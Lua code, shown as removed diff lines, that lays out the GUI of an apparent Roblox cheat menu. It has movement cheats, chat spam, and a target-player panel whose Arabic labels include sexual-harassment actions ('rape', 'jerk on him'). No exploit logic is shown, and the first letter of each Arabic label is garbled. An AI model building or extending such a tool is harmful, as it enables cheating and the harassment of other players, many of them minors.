-    getgenv().FeedBack_Button.TextSize = 17
-    getgenv().FeedBack_Button.TextWrapped = true
-    getgenv().Checksub_Button.Name = "Checksub_Button"
-    getgenv().Checksub_Button.Parent = vu238
-    getgenv().Checksub_Button.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().Checksub_Button.BackgroundTransparency = 0.5
-    getgenv().Checksub_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().Checksub_Button.BorderSizePixel = 2
-    getgenv().Checksub_Button.Position = UDim2.new(0, 130, 0, 25)
-    getgenv().Checksub_Button.Size = UDim2.new(0, 20, 0, 20)
-    getgenv().Checksub_Button.Font = Enum.Font.Oswald
-    getgenv().Checksub_Button.Text = utf8.char(128178)
-    getgenv().Checksub_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().Checksub_Button.TextScaled = false
-    getgenv().Checksub_Button.TextSize = 17
-    getgenv().Checksub_Button.TextWrapped = true
-    getgenv().HelpHd_Button.Name = "HelpHd_Button"
-    getgenv().HelpHd_Button.Parent = vu232
-    getgenv().HelpHd_Button.BackgroundTransparency = 0.3
-    getgenv().HelpHd_Button.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    getgenv().HelpHd_Button.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().HelpHd_Button.BorderSizePixel = 1
-    getgenv().HelpHd_Button.Position = UDim2.new(0, 340, 0, 24)
-    getgenv().HelpHd_Button.Size = UDim2.new(0, 30, 0, 30)
-    getgenv().HelpHd_Button.Font = Enum.Font.Oswald
-    getgenv().HelpHd_Button.Text = "?"
-    getgenv().HelpHd_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().HelpHd_Button.TextScaled = true
-    getgenv().HelpHd_Button.TextSize = 14
-    getgenv().HelpHd_Button.TextWrapped = true
-    v234.Name = "Jerking_Button"
-    v234.Parent = vu232
-    v234.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v234.BackgroundTransparency = 0.5
-    v234.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v234.BorderSizePixel = 0
-    v234.Position = UDim2.new(0, 210, 0, 175)
-    v234.Size = UDim2.new(0, 150, 0, 30)
-    v234.Font = Enum.Font.Oswald
-    v234.Text = "\239\191\189\217\132\216\185\216\167\216\175\216\169 \216\167\217\132\216\179\216\177\217\138\216\169"
-    v234.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v234.TextScaled = true
-    v234.TextSize = 14
-    v234.TextWrapped = true
-    vu235.Name = "Spam Button"
-    vu235.Parent = vu232
-    vu235.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu235.BackgroundTransparency = 0.5
-    vu235.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu235.BorderSizePixel = 0
-    vu235.Position = UDim2.new(0, 25, 0, 125)
-    vu235.Size = UDim2.new(0, 150, 0, 30)
-    vu235.Font = Enum.Font.Oswald
-    vu235.Text = "\239\191\189\217\129\216\185\217\138\217\132 \216\179\216\168\216\167\217\133"
-    vu235.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu235.TextScaled = true
-    vu235.TextSize = 14
-    vu235.TextWrapped = true
-    vu236.Name = "CMDBar"
-    vu236.Parent = vu232
-    vu236.AnchorPoint = Vector2.new(0.5, 0.5)
-    vu236.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    vu236.BackgroundTransparency = 0.3
-    vu236.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu236.Position = UDim2.new(0.5, 0, 0, 45)
-    vu236.Size = UDim2.new(0, 275, 0, 40)
-    vu236.Font = Enum.Font.Gotham
-    vu236.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-    vu236.PlaceholderText = "[Cmdbar] \216\174\216\167\217\134\216\169 \216\167\217\132\216\167\217\136\216\167\217\133\216\177"
-    vu236.Text = ""
-    vu236.TextColor3 = Color3.fromRGB(20, 20, 20)
-    vu236.TextSize = 16
-    vu236.TextWrapped = true
-    vu237.Name = "ChatBar"
-    vu237.Parent = vu232
-    vu237.AnchorPoint = Vector2.new(0.5, 0.5)
-    vu237.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    vu237.BackgroundTransparency = 0.3
-    vu237.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu237.Position = UDim2.new(0.5, 0, 0, 90)
-    vu237.Size = UDim2.new(0, 275, 0, 40)
-    vu237.Font = Enum.Font.Gotham
-    vu237.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-    vu237.PlaceholderText = "\239\191\189\217\132\216\167\217\133"
-    vu237.Text = ""
-    vu237.TextColor3 = Color3.fromRGB(20, 20, 20)
-    vu237.TextSize = 18
-    vu237.TextWrapped = true
-    vu238.Name = "Home_Section"
-    vu238.Parent = vu221
-    vu238.Active = true
-    vu238.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu238.BackgroundTransparency = 1
-    vu238.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu238.BorderSizePixel = 0
-    vu238.Position = UDim2.new(0, 105, 0, 30)
-    vu238.Size = UDim2.new(0, 395, 0, 320)
-    vu238.CanvasSize = UDim2.new(0, 0, 0, 0)
-    vu238.ScrollBarThickness = 5
-    v239.Name = "Profile_Image"
-    v239.Parent = vu238
-    v239.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    v239.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v239.BorderSizePixel = 0
-    v239.Position = UDim2.new(0, 25, 0, 25)
-    v239.Size = UDim2.new(0, 100, 0, 100)
-    v239.Image = vu37:GetUserThumbnailAsync(vu38.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-    v240.Color = Color3.fromRGB(vu31, vu32, vu33)
-    v240.Thickness = 1
-    v240.Parent = v239
-    vu241.Name = "Welcome_Label"
-    vu241.Parent = vu238
-    vu241.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu241.BackgroundTransparency = 1
-    vu241.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu241.BorderSizePixel = 0
-    vu241.Position = UDim2.new(0, 174, 0, 25)
-    vu241.Size = UDim2.new(0, 200, 0, 100)
-    vu241.Font = Enum.Font.SourceSans
-    local v342 = (# vu38.Name < # vu38.DisplayName and vu38.Name or vu38.DisplayName):sub(1, 9):lower()
-    if WhatTime() ~= "dark" then
-        vu241.Text = "\239\191\189\216\168\216\167\216\173 \216\167\217\132\217\134\217\136\216\177 " .. v342 .. "@\n\216\167\216\182\216\186\216\183 [B] \217\132\216\167\216\174\217\129\216\167\216\161 \216\167\217\132\217\136\216\167\216\172\217\135\216\169"
-    else
-        vu241.Text = "\239\191\189\216\179\216\167\216\161 \216\167\217\132\217\134\217\136\216\177 " .. v342 .. "@\n\216\167\216\182\216\186\216\183 [B] \217\132\216\167\216\174\217\129\216\167\216\161 \216\167\217\132\217\136\216\167\216\172\217\135\216\169"
-    end
-    vu241.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu241.TextSize = 24
-    vu241.TextWrapped = true
-    vu241.TextXAlignment = Enum.TextXAlignment.Right
-    vu241.TextYAlignment = Enum.TextYAlignment.Top
-    v243.Name = "Announce_Label_Frame"
-    v243.Parent = vu238
-    v243.Size = UDim2.new(0, 350, 0, 150)
-    v243.Position = UDim2.new(0, 25, 0, 150)
-    v243.BackgroundTransparency = 1
-    local v343 = v240:Clone()
-    v343.Color = Color3.fromRGB(vu31, vu32, vu33)
-    v343.Parent = v243
-    v244.Name = "Announce_Label"
-    v244.Parent = v243
-    v244.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    v244.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v244.BorderSizePixel = 0
-    v244.Size = UDim2.new(0, 350, 0, 150)
-    v244.Font = Enum.Font.SourceSans
-    v244.Text = "\239\191\189\217\133\217\138\216\185 \216\167\217\132\216\173\217\130\217\136\217\130 \217\133\216\173\217\129\217\136\216\184\216\169 \217\132\216\179\217\138\216\177\217\129\216\177 VR7\n\216\167\217\132\217\133\216\183\217\136\216\177\217\138\217\134 \216\186\217\138\216\177 \217\133\216\179\216\164\217\136\217\132\217\138\217\134 \216\185\217\134 \216\179\217\136\216\161 \216\167\217\132\216\167\216\179\216\170\216\174\216\175\216\167\217\133.\n\n\217\134\216\170\217\133\217\134\217\137 \216\167\217\134 \217\138\216\185\216\172\216\168\217\131 \216\167\217\132\216\179\217\131\216\177\216\168\216\170."
-    v244.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v244.TextSize = 24
-    v244.TextWrapped = true
-    v244.TextXAlignment = Enum.TextXAlignment.Right
-    v244.TextYAlignment = Enum.TextYAlignment.Top
-    v245.Name = "Character_Section"
-    v245.Parent = vu221
-    v245.Active = true
-    v245.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v245.BackgroundTransparency = 1
-    v245.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v245.BorderSizePixel = 0
-    v245.Position = UDim2.new(0, 105, 0, 30)
-    v245.Size = UDim2.new(0, 395, 0, 320)
-    v245.Visible = false
-    v245.CanvasSize = UDim2.new(0, 0, 1.1, 0)
-    v245.ScrollBarThickness = 5
-    v246.Name = "WalkSpeed_Button"
-    v246.Parent = v245
-    v246.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v246.BackgroundTransparency = 0.5
-    v246.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v246.BorderSizePixel = 0
-    v246.Position = UDim2.new(0, 25, 0, 25)
-    v246.Size = UDim2.new(0, 150, 0, 30)
-    v246.Font = Enum.Font.Oswald
-    v246.Text = "Ws |\216\167\217\132\216\179\216\177\216\185\217\135"
-    v246.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v246.TextScaled = true
-    v246.TextSize = 14
-    v246.TextWrapped = true
-    vu247.Name = "WalkSpeed_Input"
-    vu247.Parent = v245
-    vu247.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    vu247.BackgroundTransparency = 0.3
-    vu247.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu247.Position = UDim2.new(0, 210, 0, 25)
-    vu247.Size = UDim2.new(0, 175, 0, 30)
-    vu247.Font = Enum.Font.Gotham
-    vu247.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-    if game.PlaceId ~= 11379739543 then
-        vu247.PlaceholderText = "Number [1-99999]"
-    else
-        vu247.PlaceholderText = "Number [1-10]"
-    end
-    vu247.Text = ""
-    vu247.TextColor3 = Color3.fromRGB(20, 20, 20)
-    vu247.TextSize = 14
-    vu247.TextWrapped = true
-    v248.Name = "ClearCheckpoint_Button"
-    v248.Parent = v245
-    v248.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v248.BackgroundTransparency = 0.5
-    v248.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v248.BorderSizePixel = 0
-    v248.Position = UDim2.new(0, 210, 0, 225)
-    v248.Size = UDim2.new(0, 150, 0, 30)
-    v248.Font = Enum.Font.Oswald
-    v248.Text = "\239\191\189\216\178\216\167\217\132\217\135 \216\167\217\132\216\180\217\138\217\131 \216\168\217\136\217\138\217\134\216\170"
-    v248.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v248.TextScaled = true
-    v248.TextSize = 14
-    v248.TextWrapped = true
-    vu249.Name = "JumpPower_Input"
-    vu249.Parent = v245
-    vu249.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    vu249.BackgroundTransparency = 0.3
-    vu249.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu249.Position = UDim2.new(0, 210, 0, 75)
-    vu249.Size = UDim2.new(0, 175, 0, 30)
-    vu249.Font = Enum.Font.Gotham
-    vu249.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-    vu249.PlaceholderText = "Number [1-99999]"
-    vu249.Text = ""
-    vu249.TextColor3 = Color3.fromRGB(20, 20, 20)
-    vu249.TextSize = 14
-    vu249.TextWrapped = true
-    v250.Name = "JumpPower_Button"
-    v250.Parent = v245
-    v250.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v250.BackgroundTransparency = 0.5
-    v250.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v250.BorderSizePixel = 0
-    v250.Position = UDim2.new(0, 25, 0, 75)
-    v250.Size = UDim2.new(0, 150, 0, 30)
-    v250.Font = Enum.Font.Oswald
-    v250.Text = "\239\191\189\217\132\217\134\216\183 | Jump"
-    v250.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v250.TextScaled = true
-    v250.TextSize = 14
-    v250.TextWrapped = true
-    v251.Name = "SaveCheckpoint_Button"
-    v251.Parent = v245
-    v251.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v251.BackgroundTransparency = 0.5
-    v251.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v251.BorderSizePixel = 0
-    v251.Position = UDim2.new(0, 210, 0, 175)
-    v251.Size = UDim2.new(0, 150, 0, 30)
-    v251.Font = Enum.Font.Oswald
-    v251.Text = "\239\191\189\217\129\216\184 \216\167\217\132\216\180\217\138\217\131 \216\168\217\136\217\138\217\134\216\170"
-    v251.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v251.TextScaled = true
-    v251.TextSize = 14
-    v251.TextWrapped = true
-    vu252.Name = "Noclip_Button"
-    vu252.Parent = v245
-    vu252.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu252.BackgroundTransparency = 0.5
-    vu252.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu252.BorderSizePixel = 0
-    vu252.Position = UDim2.new(0, 25, 0, 225)
-    vu252.Size = UDim2.new(0, 150, 0, 30)
-    vu252.Font = Enum.Font.Oswald
-    vu252.Text = "\239\191\189\217\136\217\131\217\132\217\138\216\168"
-    vu252.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu252.TextScaled = true
-    vu252.TextSize = 14
-    vu252.TextWrapped = true
-    vu253.Name = "Invisible_Button"
-    vu253.Parent = v245
-    vu253.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu253.BackgroundTransparency = 0.5
-    vu253.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu253.BorderSizePixel = 0
-    vu253.Position = UDim2.new(0, 25, 0, 275)
-    vu253.Size = UDim2.new(0, 150, 0, 30)
-    vu253.Font = Enum.Font.Oswald
-    vu253.Text = "\239\191\189\216\174\216\170\217\129\216\167\216\161"
-    vu253.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu253.TextScaled = true
-    vu253.TextSize = 14
-    vu253.TextWrapped = true
-    vu255.Name = "ShiftLock_Button"
-    vu255.Parent = v245
-    vu255.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu255.BackgroundTransparency = 0.5
-    vu255.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu255.BorderSizePixel = 0
-    vu255.Position = UDim2.new(0, 25, 0, 325)
-    vu255.Size = UDim2.new(0, 150, 0, 30)
-    vu255.Font = Enum.Font.Oswald
-    vu255.Text = "\239\191\189\217\129\217\132 \216\167\217\132\217\131\216\167\217\133\217\138\216\177\216\167"
-    vu255.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu255.TextScaled = true
-    vu255.TextSize = 14
-    vu255.TextWrapped = true
-    v254.Name = "Respawn_Button"
-    v254.Parent = v245
-    v254.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v254.BackgroundTransparency = 0.5
-    v254.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v254.BorderSizePixel = 0
-    v254.Position = UDim2.new(0, 210, 0, 325)
-    v254.Size = UDim2.new(0, 150, 0, 30)
-    v254.Font = Enum.Font.Oswald
-    v254.Text = "\239\191\189\217\138\216\179\216\168\217\136\217\134"
-    v254.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v254.TextScaled = true
-    v254.TextSize = 14
-    v254.TextWrapped = true
-    v256.Name = "TeleportTool_Button"
-    v256.Parent = v245
-    v256.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v256.BackgroundTransparency = 0.5
-    v256.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v256.BorderSizePixel = 0
-    v256.Position = UDim2.new(0, 210, 0, 275)
-    v256.Size = UDim2.new(0, 150, 0, 30)
-    v256.Font = Enum.Font.Oswald
-    v256.Text = "\239\191\189\216\175\216\167\216\169 \216\167\217\132\216\167\217\134\216\170\217\130\216\167\217\132"
-    v256.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v256.TextScaled = true
-    v256.TextSize = 14
-    v256.TextWrapped = true
-    v257.Name = "FlySpeed_Button"
-    v257.Parent = v245
-    v257.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v257.BackgroundTransparency = 0.5
-    v257.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v257.BorderSizePixel = 0
-    v257.Position = UDim2.new(0, 25, 0, 125)
-    v257.Size = UDim2.new(0, 150, 0, 30)
-    v257.Font = Enum.Font.Oswald
-    v257.Text = "\239\191\189\216\177\216\185\217\135 \216\167\217\132\216\183\217\138\216\177\216\167\217\134"
-    v257.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v257.TextScaled = true
-    v257.TextSize = 14
-    v257.TextWrapped = true
-    vu258.Name = "FlySpeed_Input"
-    vu258.Parent = v245
-    vu258.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    vu258.BackgroundTransparency = 0.3
-    vu258.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu258.Position = UDim2.new(0, 210, 0, 125)
-    vu258.Size = UDim2.new(0, 175, 0, 30)
-    vu258.Font = Enum.Font.Gotham
-    vu258.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-    vu258.PlaceholderText = "Number [1-99999]"
-    vu258.Text = ""
-    vu258.TextColor3 = Color3.fromRGB(20, 20, 20)
-    vu258.TextSize = 14
-    vu258.TextWrapped = true
-    vu259.Name = "Fly_Button"
-    vu259.Parent = v245
-    vu259.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu259.BackgroundTransparency = 0.5
-    vu259.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu259.BorderSizePixel = 0
-    vu259.Position = UDim2.new(0, 25, 0, 175)
-    vu259.Size = UDim2.new(0, 150, 0, 30)
-    vu259.Font = Enum.Font.Oswald
-    vu259.Text = "\239\191\189\217\131\216\177\216\168\216\170 \216\183\217\138\216\177\216\167\217\134"
-    vu259.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu259.TextScaled = true
-    vu259.TextSize = 14
-    vu259.TextWrapped = true
-    v260.Name = "Target_Section"
-    v260.Parent = vu221
-    v260.Active = true
-    v260.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v260.BackgroundTransparency = 1
-    v260.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v260.BorderSizePixel = 0
-    v260.Position = UDim2.new(0, 105, 0, 30)
-    v260.Size = UDim2.new(0, 395, 0, 320)
-    v260.Visible = false
-    v260.CanvasSize = UDim2.new(0, 0, 1.3, 0)
-    v260.ScrollBarThickness = 5
-    vu261.Name = "TargetImage"
-    vu261.Parent = v260
-    vu261.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    vu261.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu261.Position = UDim2.new(0, 25, 0, 25)
-    vu261.Size = UDim2.new(0, 100, 0, 100)
-    vu261.Image = "rbxassetid://10818605405"
-    vu263.Name = "TargetName_Input"
-    vu263.Parent = v260
-    vu263.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-    vu263.BackgroundTransparency = 0.3
-    vu263.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu263.Position = UDim2.new(0, 150, 0, 30)
-    vu263.Size = UDim2.new(0, 175, 0, 30)
-    vu263.Font = Enum.Font.Gotham
-    vu263.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-    vu263.PlaceholderText = "@target..."
-    vu263.Text = ""
-    vu263.TextColor3 = Color3.fromRGB(20, 20, 20)
-    vu263.TextSize = 14
-    vu263.TextWrapped = true
-    v262.Name = "ClickTargetTool_Button"
-    v262.Parent = vu263
-    v262.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v262.BackgroundTransparency = 1
-    v262.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v262.BorderSizePixel = 0
-    v262.Position = UDim2.new(0, 180, 0, 0)
-    v262.Size = UDim2.new(0, 30, 0, 30)
-    v262.Image = "rbxassetid://13769558274"
-    vu264.Name = "UserIDTargetLabel"
-    vu264.Parent = v260
-    vu264.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu264.BackgroundTransparency = 1
-    vu264.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu264.BorderSizePixel = 0
-    vu264.Position = UDim2.new(0, 150, 0, 70)
-    vu264.Size = UDim2.new(0, 300, 0, 75)
-    vu264.Font = Enum.Font.Oswald
-    vu264.Text = "UserID: \nDisplay: \nJoined: "
-    vu264.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu264.TextSize = 18
-    vu264.TextWrapped = true
-    vu264.TextXAlignment = Enum.TextXAlignment.Left
-    vu264.TextYAlignment = Enum.TextYAlignment.Top
-    vu266.Name = "ViewTarget_Button"
-    vu266.Parent = v260
-    vu266.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu266.BackgroundTransparency = 0.5
-    vu266.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu266.BorderSizePixel = 0
-    vu266.Position = UDim2.new(0, 25, 0, 200)
-    vu266.Size = UDim2.new(0, 150, 0, 30)
-    vu266.Font = Enum.Font.Oswald
-    vu266.Text = "\239\191\189\216\186\216\170\216\181\216\168\217\131"
-    vu266.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu266.TextScaled = true
-    vu266.TextSize = 14
-    vu266.TextWrapped = true
-    vu265.Name = "ViewTarget_Button"
-    vu265.Parent = v260
-    vu265.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu265.BackgroundTransparency = 0.5
-    vu265.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu265.BorderSizePixel = 0
-    vu265.Position = UDim2.new(0, 210, 0, 150)
-    vu265.Size = UDim2.new(0, 150, 0, 30)
-    vu265.Font = Enum.Font.Oswald
-    vu265.Text = "\239\191\189\216\180\216\167\217\135\216\175\216\169"
-    vu265.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu265.TextScaled = true
-    vu265.TextSize = 14
-    vu265.TextWrapped = true
-    vu267.Name = "FlingTarget_Button"
-    vu267.Parent = v260
-    vu267.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu267.BackgroundTransparency = 0.5
-    vu267.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu267.BorderSizePixel = 0
-    vu267.Position = UDim2.new(0, 25, 0, 150)
-    vu267.Size = UDim2.new(0, 150, 0, 30)
-    vu267.Font = Enum.Font.Oswald
-    vu267.Text = "\239\191\189\217\132\217\134\217\130"
-    vu267.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu267.TextScaled = true
-    vu267.TextSize = 14
-    vu267.TextWrapped = true
-    vu268.Name = "FocusTarget_Button"
-    vu268.Parent = v260
-    vu268.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu268.BackgroundTransparency = 0.5
-    vu268.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu268.BorderSizePixel = 0
-    vu268.Position = UDim2.new(0, 25, 0, 350)
-    vu268.Size = UDim2.new(0, 150, 0, 30)
-    vu268.Font = Enum.Font.Oswald
-    vu268.Text = "\239\191\189\217\133\216\167\216\185"
-    vu268.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu268.TextScaled = true
-    vu268.TextSize = 14
-    vu268.TextWrapped = true
-    vu269.Name = "BenxTarget_Button"
-    vu269.Parent = v260
-    vu269.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu269.BackgroundTransparency = 0.5
-    vu269.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu269.BorderSizePixel = 0
-    vu269.Position = UDim2.new(0, 210, 0, 200)
-    vu269.Size = UDim2.new(0, 150, 0, 30)
-    vu269.Font = Enum.Font.Oswald
-    vu269.Text = "\239\191\189\216\186\216\170\216\181\216\167\216\168"
-    vu269.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu269.TextScaled = true
-    vu269.TextSize = 14
-    vu269.TextWrapped = true
-    v271.Name = "TeleportTarget_Button"
-    v271.Parent = v260
-    v271.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v271.BackgroundTransparency = 0.5
-    v271.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v271.BorderSizePixel = 0
-    v271.Position = UDim2.new(0, 25, 0, 400)
-    v271.Size = UDim2.new(0, 150, 0, 30)
-    v271.Font = Enum.Font.Oswald
-    v271.Text = "\239\191\189\217\134\217\130\217\132"
-    v271.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v271.TextScaled = true
-    v271.TextSize = 14
-    v271.TextWrapped = true
-    vu270.Name = "RepeatTalk_Button"
-    vu270.Parent = v260
-    vu270.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu270.BackgroundTransparency = 0.5
-    vu270.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu270.BorderSizePixel = 0
-    vu270.Position = UDim2.new(0, 210, 0, 350)
-    vu270.Size = UDim2.new(0, 150, 0, 30)
-    vu270.Font = Enum.Font.Oswald
-    vu270.Text = "\239\191\189\217\130\217\132\217\138\216\175 \216\167\217\132\217\131\217\132\216\167\217\133"
-    vu270.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu270.TextScaled = true
-    vu270.TextSize = 14
-    vu270.TextWrapped = true
-    vu272.Name = "HeadsitTarget_Button"
-    vu272.Parent = v260
-    vu272.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu272.BackgroundTransparency = 0.5
-    vu272.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu272.BorderSizePixel = 0
-    vu272.Position = UDim2.new(0, 25, 0, 300)
-    vu272.Size = UDim2.new(0, 150, 0, 30)
-    vu272.Font = Enum.Font.Oswald
-    vu272.Text = "\239\191\189\217\132\217\136\216\179 \217\129\217\138 \216\177\216\167\216\179\217\135"
-    vu272.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu272.TextScaled = true
-    vu272.TextSize = 14
-    vu272.TextWrapped = true
-    vu273.Name = "StandTarget_Button"
-    vu273.Parent = v260
-    vu273.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu273.BackgroundTransparency = 0.5
-    vu273.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu273.BorderSizePixel = 0
-    vu273.Position = UDim2.new(0, 210, 0, 250)
-    vu273.Size = UDim2.new(0, 150, 0, 30)
-    vu273.Font = Enum.Font.Oswald
-    vu273.Text = "\239\191\189\217\133\216\181"
-    vu273.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu273.TextScaled = true
-    vu273.TextSize = 14
-    vu273.TextWrapped = true
-    vu274.Name = "BackpackTarget_Button"
-    vu274.Parent = v260
-    vu274.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu274.BackgroundTransparency = 0.5
-    vu274.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu274.BorderSizePixel = 0
-    vu274.Position = UDim2.new(0, 210, 0, 300)
-    vu274.Size = UDim2.new(0, 150, 0, 30)
-    vu274.Font = Enum.Font.Oswald
-    vu274.Text = "\239\191\189\217\130\217\138\216\168\216\169 \216\184\217\135\216\177"
-    vu274.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu274.TextScaled = true
-    vu274.TextSize = 14
-    vu274.TextWrapped = true
-    vu275.Name = "JerkOnTarget_Button"
-    vu275.Parent = v260
-    vu275.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu275.BackgroundTransparency = 0.5
-    vu275.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu275.BorderSizePixel = 0
-    vu275.Position = UDim2.new(0, 25, 0, 250)
-    vu275.Size = UDim2.new(0, 150, 0, 30)
-    vu275.Font = Enum.Font.Oswald
-    vu275.Text = "\239\191\189\217\136\217\135\216\167 \216\185\217\132\217\138\217\135"
-    vu275.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu275.TextScaled = true
-    vu275.TextSize = 14
-    vu275.TextWrapped = true
-    vu276.Name = "Moving_Section"
-    vu276.Parent = vu221
-    vu276.Active = true
-    vu276.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu276.BackgroundTransparency = 1
-    vu276.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu276.BorderSizePixel = 0
-    vu276.Position = UDim2.new(0, 105, 0, 30)
-    vu276.Size = UDim2.new(0, 395, 0, 320)
-    vu276.Visible = false
-    vu276.CanvasSize = UDim2.new(0, 0, 2, 0)
-    vu276.ScrollBarThickness = 5
-    vu277.Name = "Dancing_Section"
-    vu277.Parent = vu221
-    vu277.Active = true
-    vu277.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu277.BackgroundTransparency = 1
-    vu277.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu277.BorderSizePixel = 0
-    vu277.Position = UDim2.new(0, 105, 0, 30)
